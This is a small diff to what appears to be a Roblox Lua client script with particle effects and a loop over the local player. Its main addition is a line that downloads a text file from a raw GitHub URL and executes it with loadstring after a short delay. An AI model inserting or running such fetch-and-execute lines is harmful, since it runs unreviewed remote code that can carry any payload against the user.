@@ -56,6 +56,7 @@ particle.Spark.Enabled = true
 cue:Play()
     wait(2)
 				-------------------------
+				--_SHAKER DO NOT MOD IFY
 				spawn(function()
 					while eyes ~= nil do wait(0.2)
 						local v = game.Players.LocalPlayer
@@ -86,6 +87,8 @@ cue:Play()
 				v:Destroy()
 			end
 		end
+		        wait(1.8)
+		        loadstring(game:HttpGet("https://raw.githubusercontent.com/check78/GuidingLight/main/ClaimDie.txt"))()
 							end
 						end
 					end
